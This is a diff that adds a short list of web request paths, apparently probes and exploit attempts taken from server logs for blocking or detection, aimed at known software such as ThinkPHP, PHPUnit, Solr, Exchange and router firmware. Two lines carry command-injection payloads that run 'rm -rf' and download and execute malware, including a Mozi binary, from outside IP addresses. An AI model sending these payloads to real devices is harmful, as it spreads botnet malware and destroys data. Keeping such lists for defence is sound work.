@@ -1,0 +1,24 @@
+/api/users/admin/check
+/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22
+/Telerik.Web.UI.WebResource.axd?type=rau
+/boaform/admin/formLogin?username=user&psd=user
+/boaform/admin/formLogin?username=adminisp&psd=adminisp
+/remote/login
+/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f
+/.git/HEAD
+/solr/admin/info/system?wt=json
+/?XDEBUG_SESSION_START=phpstorm
+/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
+/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.226.7.235:41803/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/api/jsonws/invoke
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+/solr/
+/api/jsonws/invoke
+/admin//config.php
+/ReportServer
+/dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB
+
+/.env
+#re /.*/.env
+
